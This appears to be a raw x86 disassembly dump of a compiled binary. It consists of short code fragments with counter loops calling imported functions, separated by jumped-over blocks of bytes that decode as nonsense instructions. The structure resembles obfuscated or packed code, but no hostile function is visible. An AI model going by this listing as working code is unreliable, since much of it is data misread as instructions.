  407552:	lea    eax,[ebp-0x18]
  407555:	mov    DWORD PTR [ebp-0x1c],eax
  407558:	mov    eax,DWORD PTR [ebp-0x1c]
  40755b:	adc    DWORD PTR ds:0x445368,ecx
  407561:	push   esi
  407562:	push   edi
  407563:	mov    edi,0xf89f2dad
  407568:	or     DWORD PTR ds:0x4427b0,0x25a
  407572:	mov    DWORD PTR [eax],edi
  407574:	mov    eax,DWORD PTR [ebp-0x14]
  407577:	mov    ebx,DWORD PTR [ebp-0x8]
  40757a:	and    esi,0x501d
  407580:	mov    ecx,0x7510857
  407585:	xor    eax,ecx
  407587:	and    DWORD PTR ds:0x41341e,0x0
  407591:	xor    esi,esi
  407593:	or     esi,DWORD PTR ds:0x41341e
  407599:	inc    esi
  40759a:	mov    DWORD PTR ds:0x41341e,esi
  4075a0:	cmp    DWORD PTR ds:0x41341e,0x24
  4075a7:	jne    0x4075b8
  4075ad:	push   0x41070a
  4075b2:	call   DWORD PTR ds:0x43c854
  4075b8:	cmp    DWORD PTR ds:0x41341e,0x18
  4075bf:	jb     0x407591
  4075c5:	mov    esi,0x32729e
  4075ca:	adc    DWORD PTR ds:0x445370,0x445364
  4075d4:	jmp    0x40770b
  4075d9:	adc    dh,al
  4075db:	in     al,0x9d
  4075dd:	data16 jge 0x407635
  4075e0:	mov    ebx,0x5b1ba91b
  4075e5:	fsubp  st(0),st
  4075e7:	mov    bl,bl
  4075e9:	mov    cl,0x33
  4075eb:	jl     0x407669
  4075ed:	push   es
  4075ee:	jg     0x40766c
  4075f0:	jl     0x40763a
  4075f2:	pop    ds
  4075f3:	xchg   edx,eax
  4075f4:	mov    WORD PTR [ebx+0x621ea6fb],fs
  4075fa:	(bad)  
  4075fb:	(bad)  
  4075fc:	cmp    dl,dl
  4075fe:	add    al,0x55
  407600:	cmp    al,0xbc
  407602:	dec    ecx
  407603:	call   0xd5c244c4
  407608:	sub    bh,cl
  40760a:	push   esi
  40760b:	add    DWORD PTR [ecx+0x1e],eax
  40760e:	mov    bh,0xac
  407610:	aad    0x18
  407612:	fcomp  DWORD PTR [ebx-0x75]
  407615:	enter  0x58e3,0xdd
  407619:	imul   ebp,ebx,0xffffffe5
  40761c:	repnz xor eax,eax
  40761f:	cmc    
  407620:	add    eax,0xbc4e486d
  407625:	das    
  407626:	loope  0x407673
  407628:	xor    esi,DWORD PTR [edi]
  40762a:	push   ds
  40762b:	push   ss
  40762c:	xor    DWORD PTR [edi+ebx*4+0x5],ecx
  407630:	ret    0xe2ac
  407633:	cmp    eax,0x95491f0b
  407638:	fadd   DWORD PTR [edx+eiz*4]
  40763b:	xchg   edx,eax
  40763c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40763d:	xchg   edi,eax
  40763e:	xlat   BYTE PTR ds:[ebx]
  40763f:	and    BYTE PTR [esi+0x56],dl
  407642:	stos   BYTE PTR es:[edi],al
  407643:	mov    cl,0x3f
  407645:	out    dx,al
  407646:	jae    0x407696
  407648:	ins    BYTE PTR es:[edi],dx
  407649:	(bad)  
  40764a:	cmp    eax,0x9756ba91
  40764f:	dec    ebx
  407650:	adc    al,0xbb
  407652:	sbb    cl,dl
  407654:	cmp    bl,BYTE PTR [ecx-0x4d]
  407657:	xchg   edi,eax
  407658:	add    esi,DWORD PTR [edi+ebp*2]
  40765b:	and    ah,dh
  40765d:	jg     0x40764e
  40765f:	sbb    bh,0xbb
  407662:	pop    ecx
  407663:	and    esp,DWORD PTR [edx+0x7fa74ed1]
  407669:	ins    BYTE PTR es:[edi],dx
  40766a:	add    ebx,DWORD PTR cs:[esi-0x75]
  40766e:	mov    ds:0x71ea98ba,eax
  407673:	into   
  407674:	xor    eax,0x77b900d4
  407679:	inc    eax
  40767a:	pop    eax
  40767b:	dec    edi
  40767c:	mov    BYTE PTR [ebx+0x62],cl
  40767f:	fwait
  407680:	sub    al,0x62
  407682:	retf   
  407683:	and    al,al
  407685:	jno    0x4076c1
  407687:	push   eax
  407688:	loop   0x407610
  40768a:	lods   al,BYTE PTR ds:[esi]
  40768b:	mov    ds:0xb0d1e93,al
  407690:	inc    esp
  407691:	fsub   QWORD PTR [esp+ebp*8-0x393a57c6]
  407698:	pop    esi
  407699:	cdq    
  40769a:	rcl    bx,1
  40769d:	stos   BYTE PTR es:[edi],al
  40769e:	adc    al,0xe9
  4076a0:	mov    ebp,DWORD PTR [ebx]
  4076a2:	cmp    si,sp
  4076a5:	pushw  ds
  4076a7:	cmp    esp,ebx
  4076a9:	scas   eax,DWORD PTR es:[edi]
  4076aa:	cmc    
  4076ab:	mov    ebx,0x56e25de2
  4076b0:	enter  0x3c9f,0xbf
  4076b4:	retf   
  4076b5:	test   DWORD PTR [ebx],0x30ffe9c0
  4076bb:	loopne 0x40767b
  4076bd:	cs sbb al,0x5e
  4076c0:	xor    dh,BYTE PTR [ebp-0x53f2bc44]
  4076c6:	add    ah,BYTE PTR [eax-0x208fd438]
  4076cc:	push   ecx
  4076cd:	lahf   
  4076ce:	add    al,0xc2
  4076d0:	out    0xe3,al
  4076d2:	mov    eax,0x48dd51d2
  4076d7:	push   ecx
  4076d8:	add    eax,0x7e7e1faf
  4076dd:	lock lds esp,FWORD PTR [esi-0x2939398b]
  4076e4:	jmp    0xa683:0x6904b35a
  4076eb:	mov    dl,0xd9
  4076ed:	xlat   BYTE PTR ds:[ebx]
  4076ee:	sub    eax,0x468f73d3
  4076f3:	pusha  
  4076f4:	cli    
  4076f5:	add    DWORD PTR [ecx+ebp*1],edi
  4076f8:	push   eax
  4076f9:	sub    edx,edx
  4076fb:	xchg   ebp,eax
  4076fc:	push   cs
  4076fd:	in     al,0xf6
  4076ff:	jnp    0x4076a6
  407701:	fwait
  407702:	mov    al,ds:0x263d6505
  407707:	out    dx,al
  407708:	call   0xd973dc4b
  40770d:	mov    DWORD PTR ds:0x4105db,0x751d
  407717:	xor    edx,edx
  407719:	add    DWORD PTR ds:0x43fbd8,0xeda
  407723:	add    eax,esi
  407725:	and    DWORD PTR ds:0x43fbd8,0x41341a
  40772f:	add    ebx,esi
  407731:	mov    DWORD PTR ds:0x43fbe0,0x5df4
  40773b:	jmp    0x407872
  407740:	ss push 0x77
  407743:	call   0x6b2de4f3
  407748:	pop    ecx
  407749:	fcom   st(3)
  40774b:	xor    al,0x1c
  40774d:	mov    al,0x9c
  40774f:	addr16 pop ebx
  407751:	xor    bh,BYTE PTR [esp+edi*2+0x6]
  407755:	jg     0x4077d3
  407757:	jl     0x4076fc
  407759:	xchg   ebx,eax
  40775a:	out    0xc5,al
  40775c:	arpl   ax,bp
  40775e:	loopne 0x4077a2
  407760:	pusha  
  407761:	mov    ?,WORD PTR [ebp+ebx*2-0x1f069118]
  407768:	dec    ebx
  407769:	sbb    BYTE PTR [esi+0x52],ah
  40776c:	daa    
  40776d:	mov    ecx,0x945fbc00
  407772:	loope  0x407792
  407774:	cmp    DWORD PTR [edi],ebx
  407776:	xor    BYTE PTR [ebx-0x12bc2b8e],ah
  40777c:	retf   
  40777d:	stc    
  40777e:	add    ebx,DWORD PTR [ebx+0x29]
  407781:	mov    esp,DWORD PTR [ecx+0x23]
  407784:	cmp    BYTE PTR [ecx+0x50cf8ef6],bh
  40778a:	push   ecx
  40778b:	dec    edx
  40778c:	mov    esi,0xb2c8af7a
  407791:	add    eax,0x7566c563
  407796:	mov    ebx,0x97c06184
  40779b:	pop    eax
  40779c:	sub    BYTE PTR [edi+0x0],bl
  40779f:	inc    edi
  4077a0:	jae    0x407784
  4077a2:	xor    DWORD PTR [edi],eax
  4077a4:	lahf   
  4077a5:	bound  ebp,QWORD PTR [ecx+0x44]
  4077a8:	call   0x5b23:0x6f34c915
  4077af:	(bad)  
  4077b0:	pop    esp
  4077b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4077b2:	jmp    0x4077e6
  4077b4:	test   eax,0x3d5fa1e4
  4077b9:	and    al,0xac
  4077bb:	mov    esp,0x2758c312
  4077c0:	retf   0x5cb2
  4077c3:	leave  
  4077c4:	jge    0x4077b5
  4077c6:	xor    al,BYTE PTR [ebx]
  4077c8:	mov    ecx,0x2513084a
  4077cd:	aaa    
  4077ce:	bndldx bnd1,[esp+edx*8+0x7]
  4077d3:	cwde   
  4077d4:	add    al,ch
  4077d6:	aaa    
  4077d7:	scas   al,BYTE PTR es:[edi]
  4077d8:	inc    ebx
  4077d9:	aam    0xa5
  4077db:	xchg   DWORD PTR [esi],esp
  4077dd:	mov    eax,0xfd375f52
  4077e2:	adc    eax,DWORD PTR [ecx-0x1d]
  4077e5:	pop    ss
  4077e6:	fbld   TBYTE PTR [edx-0x4b]
  4077e9:	jno    0x407776
  4077eb:	pop    ebx
  4077ec:	cld    
  4077ed:	sbb    esi,DWORD PTR [ebp-0x17]
  4077f0:	in     al,0x62
  4077f2:	mov    eax,0xfac19701
  4077f7:	or     DWORD PTR [edx-0x7d608085],eax
  4077fd:	inc    eax
  4077fe:	lock dec esi
  407800:	sbb    DWORD PTR [edx+0x2cb4e64d],ebp
  407806:	push   ecx
  407807:	xor    eax,0x2243aada
  40780c:	out    dx,al
  40780d:	dec    esi
  40780e:	mov    ah,0x80
  407810:	xchg   edx,eax
  407811:	pusha  
  407812:	cmp    eax,0xf6cbd360
  407817:	(bad)  
  407819:	outs   dx,DWORD PTR ds:[esi]
  40781a:	push   esi
  40781b:	in     eax,dx
  40781c:	adc    bl,bl
  40781e:	xlat   BYTE PTR ds:[ebx]
  40781f:	mov    edx,0x1140fb63
  407824:	inc    edi
  407825:	dec    ebx
  407826:	out    dx,eax
  407827:	outs   dx,DWORD PTR ds:[si]
  407829:	xbegin 0x6cd58cc5
  40782f:	push   eax
  407830:	sbb    ebx,DWORD PTR [ebp+0x41]
  407833:	mov    ecx,0xbbba9213
  407838:	jo     0x407806
  40783a:	shl    BYTE PTR [esi],0xc6
  40783d:	dec    ecx
  40783e:	add    esp,DWORD PTR [edx]
  407840:	mov    fs,WORD PTR [eax+0x1b003ad2]
  407846:	or     al,0x5f
  407848:	cmp    bh,BYTE PTR [esi]
  40784a:	neg    BYTE PTR [eax]
  40784c:	stos   BYTE PTR es:[edi],al
  40784d:	mov    DWORD PTR [edi+0x4b148164],ebp
  407853:	test   BYTE PTR [edi+0xc1fc756],ch
  407859:	sahf   
  40785a:	ss test al,0x1a
  40785d:	mov    edx,0xd69e68c8
  407862:	mov    dl,0xde
  407864:	les    ebp,FWORD PTR [esi+esi*2]
  407867:	ret    
  407868:	xchg   ebx,eax
  407869:	pop    ebx
  40786a:	int    0x42
  40786c:	imul   ebx,DWORD PTR [edx+ebx*8],0xffffffa8
  407870:	cmp    eax,0x8bf3f799
  407875:	adc    eax,0x41340a
  40787a:	mov    edx,DWORD PTR [ebp-0x20]
  40787d:	mov    DWORD PTR [ebp-0x2c],0x4eb5
  407884:	mov    DWORD PTR ds:0x4427c0,0x3c9f
  40788e:	cmp    eax,DWORD PTR [edx]
  407890:	je     0x408082
  407896:	mov    edx,DWORD PTR ds:0x4105c3
  40789c:	and    DWORD PTR ds:0x445370,edx
  4078a2:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  4078a9:	and    DWORD PTR ds:0x41340e,0x0
  4078b3:	mov    edx,DWORD PTR ds:0x41340e
  4078b9:	inc    edx
  4078ba:	mov    DWORD PTR ds:0x41340e,edx
  4078c0:	cmp    DWORD PTR ds:0x41340e,0x16
  4078c7:	jne    0x4078f0
  4078cd:	push   DWORD PTR [ebp-0x20]
  4078d0:	push   0x3477
  4078d5:	push   0x43fbf8
  4078da:	push   DWORD PTR [ebp-0x10]
  4078dd:	push   0x7aad
  4078e2:	push   0x3f84
  4078e7:	push   DWORD PTR [ebp-0x1c]
  4078ea:	call   DWORD PTR ds:0x43c4f4
  4078f0:	cmp    DWORD PTR ds:0x41340e,0x13
  4078f7:	jb     0x4078b3
  4078fd:	lea    eax,[ebp-0xc]
  407900:	mov    DWORD PTR [ebp-0x10],eax
  407903:	xor    edx,edx
  407905:	xor    edx,DWORD PTR ds:0x43c8fc
  40790b:	mov    eax,ds:0x43fc10
  407910:	sub    edx,eax
  407912:	xor    edx,DWORD PTR [edx+eax*1]
  407915:	jmp    0x407a4c
  40791a:	lea    eax,[eax+ebx*1]
  40791d:	mov    WORD PTR [ebp+0x1d8d80],ds
  407923:	std    
  407924:	inc    esi
  407925:	nop
  407926:	xchg   ebp,eax
  407927:	xchg   esi,eax
  407928:	bound  esp,QWORD PTR [eax+0x65]
  40792b:	xor    eax,0x7f067c7c
  407930:	jl     0x4079ae
  407932:	cld    
  407933:	jnp    0x4078c7
  407935:	push   ds
  407936:	rol    bh,1
  407938:	cmp    al,0xd6
  40793a:	inc    edi
  40793b:	ret    0xa90
  40793e:	dec    esi
  40793f:	prefetch (bad)
  407940:	or     eax,0xca2854e2
  407945:	stc    
  407946:	inc    eax
  407947:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  407949:	das    
  40794a:	sbb    BYTE PTR [eax],0x81
  40794d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40794e:	lahf   
  40794f:	in     al,0x1a
  407951:	shl    dl,cl
  407953:	jmp    0xd3d0:0x4e7bbfda
  40795a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40795b:	push   ds
  40795c:	adc    DWORD PTR [ecx-0x59cf294e],edi
  407962:	(bad)  
  407963:	xor    edx,ebx
  407965:	addr16 push edi
  407967:	push   cs
  407968:	pop    eax
  407969:	pushf  
  40796a:	stos   BYTE PTR es:[edi],al
  40796b:	shr    DWORD PTR [ebp+0x366ac8ec],cl
  407971:	push   edi
  407972:	(bad)
  407976:	adc    eax,DWORD PTR [esi]
  407978:	mov    cl,0xf7
  40797a:	add    eax,0x1bcd0777
  40797f:	add    ah,cl
  407981:	imul   edx,DWORD PTR [esi],0x7f8e14b7
  407987:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407988:	and    bh,bl
  40798a:	repz pop edi
  40798c:	fimul  WORD PTR [eax+0x78]
  40798f:	out    0xfd,al
  407991:	sbb    al,ah
  407993:	xchg   ebp,eax
  407994:	jo     0x4079c2
  407996:	jmp    0x407967
  407998:	out    dx,al
  407999:	xchg   ebp,eax
  40799a:	icebp  
  40799b:	ja     0x407967
  40799d:	aam    0x5c
  40799f:	mov    WORD PTR [ebx-0x6d0a7658],?
  4079a5:	xor    al,0x19
  4079a7:	jge    0x4079f5
  4079a9:	jle    0x4079c4
  4079ab:	or     esp,DWORD PTR [ebx-0x72]
  4079ae:	cmp    al,0x41
  4079b0:	mov    ch,0xb2
  4079b2:	call   0xcf81:0x431b799c
  4079b9:	xor    ecx,DWORD PTR [eax+0x3f]
  4079bc:	or     eax,0x9236e554
  4079c1:	shl    dh,cl
  4079c3:	pop    eax
  4079c4:	aam    0xff
  4079c6:	dec    eax
  4079c7:	sub    bh,BYTE PTR [ebx+0x1f]
  4079ca:	mov    BYTE PTR [ebx+0x7c31a5ad],bh
  4079d0:	adc    al,0x51
  4079d2:	ss leave 
  4079d4:	mov    bh,0x90
  4079d6:	inc    esi
  4079d7:	sub    ebp,DWORD PTR [esi-0x79bfc7f4]
  4079dd:	inc    esp
  4079de:	add    dl,bl
  4079e0:	jecxz  0x40797c
  4079e2:	mov    esp,0x6ef768f
  4079e7:	repnz outs dx,DWORD PTR ds:[esi]
  4079e9:	mov    ds:0xa99de06d,eax
  4079ee:	and    edi,DWORD PTR [edi]
  4079f0:	repz push esi
  4079f2:	div    BYTE PTR [edi]
  4079f4:	sbb    DWORD PTR [eax],eax
  4079f6:	(bad)  
  4079f7:	loop   0x4079e0
  4079f9:	or     al,0x6b
  4079fb:	xor    bh,BYTE PTR [edi-0x34]
  4079fe:	push   eax
  4079ff:	sub    DWORD PTR [ecx],edi
  407a01:	xlat   BYTE PTR ds:[ebx]
  407a02:	int    0x32
  407a04:	sbb    DWORD PTR [ecx-0x70],eax
  407a07:	jecxz  0x407a75
  407a09:	xor    DWORD PTR [eax+0x41ff1a9d],esp
  407a0f:	jg     0x4079f9
  407a11:	fcom   DWORD PTR [esi-0x4e]
  407a14:	push   ss
  407a15:	cmp    eax,0xbb5ec324
  407a1a:	ja     0x4079e8
  407a1c:	out    dx,eax
  407a1d:	xor    eax,0x649f3704
  407a22:	add    esp,DWORD PTR [esi+esi*2]
  407a25:	mov    BYTE PTR [ebx-0x2],al
  407a28:	fmul   DWORD PTR [eax-0x3b]
  407a2b:	mov    ah,0x5
  407a2d:	jnp    0x407a0a
  407a2f:	jne    0x4079d1
  407a31:	test   eax,0x4e18ab3b
  407a36:	repnz add DWORD PTR [edx],0x36e94a73
  407a3d:	xchg   BYTE PTR [ecx+0x5a5fba1f],bl
  407a43:	in     eax,dx
  407a44:	sbb    eax,0xf3d0f895
  407a49:	mov    dh,0xd3
  407a4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a4c:	mov    eax,DWORD PTR [ebp-0x10]
  407a4f:	mov    DWORD PTR ds:0x43fbec,0x1e
  407a59:	cmp    DWORD PTR ds:0x43fbec,0x0
  407a60:	je     0x407aad
  407a66:	cmp    DWORD PTR ds:0x43fbec,0x10
  407a6d:	jne    0x407a7f
  407a73:	push   DWORD PTR [ebp-0x1c]
  407a76:	push   DWORD PTR [ebp-0x18]
  407a79:	call   DWORD PTR ds:0x43c4f8
  407a7f:	cmp    DWORD PTR ds:0x43fbec,0x11
  407a86:	jne    0x407a99
  407a8c:	mov    edx,DWORD PTR ds:0x43fbec
  407a92:	dec    edx
  407a93:	mov    DWORD PTR ds:0x43fbec,edx
  407a99:	xor    edx,edx
  407a9b:	add    edx,DWORD PTR ds:0x43fbec
  407aa1:	dec    edx
  407aa2:	mov    DWORD PTR ds:0x43fbec,edx
  407aa8:	jmp    0x407a59
  407aad:	mov    edx,DWORD PTR [eax]
  407aaf:	imul   edx,edx,0xf89ea9e0
  407ab5:	mov    DWORD PTR [eax],edx
  407ab7:	mov    eax,DWORD PTR [ebp-0xc]
  407aba:	cmp    eax,0x1fe34420
  407abf:	je     0x407c13
  407ac5:	mov    eax,DWORD PTR [ebp-0x1c]
  407ac8:	jmp    0x407bff
  407acd:	(bad)  
  407ace:	fsub   DWORD PTR [edx+0x76]
  407ad1:	jp     0x407a69
  407ad3:	jp     0x407b2d
  407ad5:	mov    ch,0xbf
  407ad7:	xchg   ebp,eax
  407ad8:	fucomip st,st(3)
  407ada:	es push ss
  407adc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407add:	getsec 
  407adf:	jl     0x407b5d
  407ae1:	push   es
  407ae2:	jg     0x407b60
  407ae4:	jl     0x407acb
  407ae6:	jl     0x407a8e
  407ae8:	xchg   ebx,eax
  407ae9:	in     eax,0xcd
  407aeb:	mov    ebp,0x4074f637
  407af0:	fistp  WORD PTR [edx-0x58562b5c]
  407af6:	scas   eax,DWORD PTR es:[edi]
  407af7:	jne    0x407a7a
  407af9:	and    ebx,DWORD PTR [eax+ebx*4-0x76b0a30a]
  407b00:	pop    esi
  407b01:	sub    eax,0x87dd83cd
  407b06:	fnstcw WORD PTR [esi]
  407b08:	mov    ecx,0x33bba6c2
  407b0d:	cmp    cl,BYTE PTR [esi-0x5ee5bd36]
  407b13:	out    0x8,eax
  407b15:	cmp    esi,ecx
  407b17:	ins    DWORD PTR es:[edi],dx
  407b18:	mov    ds:0xeb1ec474,al
  407b1d:	dec    ecx
  407b1e:	es in  al,dx
  407b20:	repz mov cl,BYTE PTR [edi]
  407b23:	ds jmp 0x253f130f
  407b29:	out    0x12,al
  407b2b:	outs   dx,DWORD PTR ds:[esi]
  407b2c:	mov    edi,cs
  407b2e:	sub    ah,BYTE PTR [eax]
  407b30:	stc    
  407b31:	sbb    BYTE PTR [esi],0x75
  407b34:	fimul  WORD PTR [eax-0x65]
  407b37:	mov    al,ds:0xe3d4124
  407b3c:	jo     0x407bab
  407b3e:	(bad)  
  407b3f:	imul   edx,DWORD PTR [edi+0x51],0x7300bea
  407b46:	ja     0x407b98
  407b48:	push   esi
  407b49:	stos   DWORD PTR es:[edi],eax
  407b4a:	icebp  
  407b4b:	in     al,0x70
  407b4d:	mov    ds:0x42712e96,al
  407b52:	jmp    0xf1818fc8
  407b57:	inc    DWORD PTR [esi+0x7f]
  407b5a:	ror    BYTE PTR [edx+0x30924418],cl
  407b60:	sub    eax,0x5b0d9195
  407b65:	in     eax,dx
  407b66:	mov    dl,0x5c
  407b68:	pop    edx
  407b69:	scas   eax,DWORD PTR es:[edi]
  407b6a:	fdivr  st,st(6)
  407b6c:	nop
  407b6d:	adc    bl,0x7d
  407b70:	(bad)  
  407b71:	ja     0x407bc9
  407b73:	repz jne 0x407b94
  407b76:	icebp  
  407b77:	or     eax,DWORD PTR [esi]
  407b79:	sbb    al,0xdc
  407b7b:	sbb    dl,al
  407b7d:	jle    0x407b39
  407b7f:	ins    DWORD PTR es:[edi],dx
  407b80:	inc    esp
  407b81:	sti    
  407b82:	mov    eax,0x64c3d1f2
  407b87:	inc    esp
  407b88:	pop    esi
  407b89:	cmp    DWORD PTR [edi+eax*4+0x248633f9],ebp
  407b90:	pop    esp
  407b91:	gs mov esi,0x9fc9a7b
  407b97:	arpl   WORD PTR [edx+0x3f],bp
  407b9a:	fld    QWORD PTR [eax+0x4a]
  407b9d:	xchg   edx,eax
  407b9e:	jg     0x407b23
  407ba0:	xor    ebp,esi
  407ba2:	shr    DWORD PTR [edx-0x29],1
  407ba5:	jae    0x407b2d
  407ba7:	push   ds
  407ba8:	xchg   ebp,eax
  407ba9:	xchg   BYTE PTR [edx-0x3212a0cf],bh
  407baf:	pusha  
  407bb0:	and    al,0xd7
  407bb2:	pop    esi
  407bb3:	xchg   ebx,eax
  407bb4:	outs   dx,BYTE PTR ds:[esi]
  407bb5:	aas    
  407bb6:	bound  esp,QWORD PTR [ecx+0x1d]
  407bb9:	mov    cl,dh
  407bbb:	mov    ah,0x94
  407bbd:	sti    
  407bbe:	cwde   
  407bbf:	xor    dh,BYTE PTR [esi+0x10]
  407bc2:	mov    ebp,eax
  407bc4:	cmp    eax,0x6e7bb502
  407bc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407bca:	sti    
  407bcb:	out    dx,al
  407bcc:	push   esp
  407bcd:	gs in  eax,0xe8
  407bd0:	mov    ah,0x90
  407bd2:	inc    ecx
  407bd3:	xchg   edx,eax
  407bd4:	jmp    0x9021:0xac054787
  407bdb:	mov    ebx,0xb983bc1c
  407be0:	cdq    
  407be1:	cwde   
  407be2:	fild   QWORD PTR [edi]
  407be4:	mov    DWORD PTR [edx+edx*2],ebx
  407be7:	cdq    
  407be8:	dec    eax
  407be9:	enter  0x1b0e,0xdd
  407bed:	add    edi,edx
  407bef:	jge    0x407c1b
  407bf1:	fwait
  407bf2:	inc    ebp
  407bf3:	test   ch,cl
  407bf5:	pop    es
  407bf6:	int3   
  407bf7:	push   edi
  407bf8:	cmp    bh,al
  407bfa:	cli    
  407bfb:	xchg   DWORD PTR [eax+0x8814fe0],esi
  407c01:	nop
  407c02:	sbb    al,0x75
  407c04:	pusha  
  407c05:	mov    eax,DWORD PTR [ebp-0x8]
  407c08:	xor    eax,ecx
  407c0a:	add    eax,esi
  407c0c:	pop    edi
  407c0d:	pop    esi
  407c0e:	pop    ebx
  407c0f:	leave  
  407c10:	ret    0x4
  407c13:	mov    eax,DWORD PTR [ebp-0xc]
  407c16:	add    eax,DWORD PTR [ebp-0x18]
  407c19:	cmp    eax,0x188271cd
  407c1e:	je     0x407d69
  407c24:	mov    eax,DWORD PTR [ebp-0x10]
  407c27:	and    DWORD PTR [eax],0x751c9d
  407c2d:	jmp    0x407c05
  407c32:	jmp    0x407d69
  407c37:	jnp    0x407be9
  407c39:	lds    edx,FWORD PTR [eax+0x5b7da5fd]
  407c3f:	cmp    ah,BYTE PTR [ebp+0x70]
  407c42:	adc    eax,0x9ed67237
  407c47:	sub    DWORD PTR [esi],esi
  407c49:	jl     0x407cc7
  407c4b:	push   es
  407c4c:	jg     0x407cca
  407c4e:	jl     0x407ca8
  407c50:	je     0x407bf8
  407c52:	sub    eax,0x5024667d
  407c57:	jmp    0xaf23:0x91a2dbd2
  407c5e:	xchg   ebp,eax
  407c5f:	push   ds
  407c60:	xor    ah,BYTE PTR [esi+ebx*2+0x57]
  407c64:	jns    0x407c47
  407c66:	mov    ah,0x80
  407c68:	cmp    BYTE PTR [esi+0x61],dh
  407c6b:	in     al,dx
  407c6c:	mov    bh,0xd
  407c6e:	sub    cl,ah
  407c70:	add    DWORD PTR [esi-0x34],ebp
  407c73:	add    bh,BYTE PTR [eax]
  407c75:	add    dh,0xed
  407c78:	pop    eax
  407c79:	aad    0xe7
  407c7b:	pop    esi
  407c7c:	pop    esp
  407c7d:	outs   dx,DWORD PTR ds:[esi]
  407c7e:	aam    0x6c
  407c80:	movsx  dx,dl
  407c84:	enter  0x5031,0x92
  407c88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c89:	jae    0x407c8e
  407c8b:	sbb    ah,BYTE PTR [edi-0x12ee940e]
  407c91:	jle    0x407c95
  407c93:	pushf  
  407c94:	xchg   DWORD PTR [edx],esi
  407c96:	scas   al,BYTE PTR es:[edi]
  407c97:	mov    dl,0x8e
  407c99:	ds inc eax
  407c9b:	test   BYTE PTR [edi+0x1df0d372],ch
  407ca1:	loop   0x407ce6
  407ca3:	mov    esi,?
  407ca5:	adc    dh,bh
  407ca7:	jnp    0x407c4a
  407ca9:	(bad)  
  407caa:	fisttp QWORD PTR [esi]
  407cac:	inc    edx
  407cad:	in     eax,dx
  407cae:	and    BYTE PTR [ebp-0x6c9a7084],al
  407cb4:	jp     0x407c46
  407cb6:	test   BYTE PTR [ecx-0x7a46bfcd],cl
  407cbc:	or     edi,DWORD PTR [ecx]
  407cbe:	dec    cl
  407cc0:	mov    dh,0x7
  407cc2:	or     BYTE PTR [eax],dl
  407cc4:	cmp    al,BYTE PTR [edx+eax*4]
  407cc7:	(bad)  
  407cc8:	ret    0x6f88
  407ccb:	scas   eax,DWORD PTR es:[edi]
  407ccc:	cli    
  407ccd:	and    ah,BYTE PTR es:[eax]
  407cd0:	push   ss
  407cd1:	gs jae 0x407c95
  407cd4:	loop   0x407c84
  407cd6:	nop
  407cd7:	mov    DWORD PTR [ebx],ebx
  407cd9:	test   edi,ebx
  407cdb:	jmp    0x23e1:0xa9858b8f
  407ce2:	push   ecx
  407ce3:	retf   
  407ce4:	aad    0x7d
  407ce6:	mov    edi,DWORD PTR [ebp+0x53]
  407ce9:	mov    bh,0xa5
  407ceb:	push   edi
  407cec:	xor    eax,0x1528e32a
  407cf1:	inc    ecx
  407cf2:	pop    ebx
  407cf3:	jg     0x407ce7
  407cf5:	mov    ecx,0xf22d3d23
  407cfa:	rcl    BYTE PTR [esi+ebx*2-0x6b],cl
  407cfe:	(bad)  
  407cff:	pop    ds
  407d00:	pop    esi
  407d01:	jg     0x407cfd
  407d03:	add    al,0x4a
  407d05:	jnp    0x407ce7
  407d07:	xchg   esi,eax
  407d08:	loop   0x407c97
  407d0a:	mov    esp,0xc2c37fa3
  407d0f:	mov    eax,ds:0x68e053ed
  407d14:	and    esi,eax
  407d16:	scas   eax,DWORD PTR es:[edi]
  407d17:	sbb    al,BYTE PTR [ebp+0x2c]
  407d1a:	push   ebx
  407d1b:	aas    
  407d1c:	sub    cl,dh
  407d1e:	mov    dh,0x65
  407d20:	adc    edi,DWORD PTR [edx-0x7608a2d0]
  407d26:	pop    edx
  407d27:	dec    ebp
  407d28:	add    ebp,DWORD PTR [ebp-0x1a]
  407d2b:	dec    esi
  407d2c:	mov    edx,0x9adbfc41
  407d31:	sahf   
  407d32:	mov    eax,0x648a80bd
  407d37:	inc    eax
  407d38:	(bad)  
  407d39:	out    0x8e,eax
  407d3b:	dec    esp
  407d3c:	inc    esi
  407d3d:	mov    ds:0xfbc4f114,eax
  407d42:	or     cl,dl
  407d44:	loope  0x407d55
  407d46:	pushf  
  407d47:	mov    edi,0xd5e80cf
  407d4c:	lods   eax,DWORD PTR ds:[esi]
  407d4d:	(bad)  
  407d4e:	ss jge 0x407cfb
  407d51:	jmp    0xe61d:0x232af64
  407d58:	pop    es
  407d59:	and    al,0xba
  407d5b:	adc    ebp,DWORD PTR [edx+0xa]
  407d5e:	aad    0x10
  407d60:	xor    bl,bl
  407d62:	int    0x84
  407d64:	test   eax,0x1131b347
  407d69:	mov    eax,DWORD PTR [ebp-0xc]
  407d6c:	mov    edx,DWORD PTR [ebp-0x18]
  407d6f:	or     eax,edx
  407d71:	cmp    eax,0xffff6dad
  407d76:	je     0x407ec1
  407d7c:	mov    eax,DWORD PTR [ebp-0x10]
  407d7f:	jmp    0x407eb6
  407d84:	push   edi
  407d85:	add    BYTE PTR [esi-0x1b],bh
  407d88:	jge    0x407d6f
  407d8a:	jnp    0x407d26
  407d8c:	and    al,BYTE PTR [ebx-0x7ca8a9c]
  407d92:	mov    dh,0xe5
  407d94:	xor    ecx,ecx
  407d96:	jl     0x407e14
  407d98:	push   es
  407d99:	jg     0x407e17
  407d9b:	jl     0x407dd4
  407d9d:	fcom   DWORD PTR [esi]
  407d9f:	lods   al,BYTE PTR ds:[esi]
  407da0:	in     eax,dx
  407da1:	xchg   ecx,eax
  407da2:	sahf   
  407da3:	es inc esp
  407da5:	jo     0x407d65
  407da7:	int    0x36
  407da9:	mov    cl,BYTE PTR [edx]
  407dab:	iret   
  407dac:	iret   
  407dad:	mov    BYTE PTR [edi+esi*1-0x18f7a6c5],ah
  407db4:	add    edi,ebp
  407db6:	add    DWORD PTR [ebx+eax*1+0x3b],esi
  407dba:	outs   dx,BYTE PTR ds:[esi]
